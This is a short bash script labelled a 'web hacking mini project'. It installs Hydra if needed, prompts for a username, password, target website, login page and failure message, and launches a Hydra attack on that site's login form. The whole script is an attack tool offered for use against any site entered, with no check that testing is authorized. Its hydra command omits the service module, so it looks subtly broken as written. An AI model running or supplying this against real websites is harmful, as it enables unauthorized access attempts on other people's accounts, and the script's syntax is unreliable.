#!/bin/bash
#

echo " *** WEB HACKING MINI PROJECT *** "
echo "====================================="
hy=$(hydra -v | grep hydra | awk '{print $1}')

if [ "$hy" == "Hydra" ]; then
	echo " Hydra is present."
else
	sudo apt install hydra -y
	echo " Hydra is successfully installed."
fi
read -p " Enter username: " user
echo "***********************************************"
read -p " Enter password: " pass
echo "***********************************************"
read -p " Enter your target website: " target
echo "***********************************************"
read -p " Enter your website php/html: " website
echo "***********************************************"
read -p " Enter your error message: " msg
echo "***********************************************"
read -p " Enter your text file: " txt
echo "*************************************************"

hydra -l $user -p $pass $target "$website:username=^USER^&password=^PASS^:$msg" -vV -o $txt
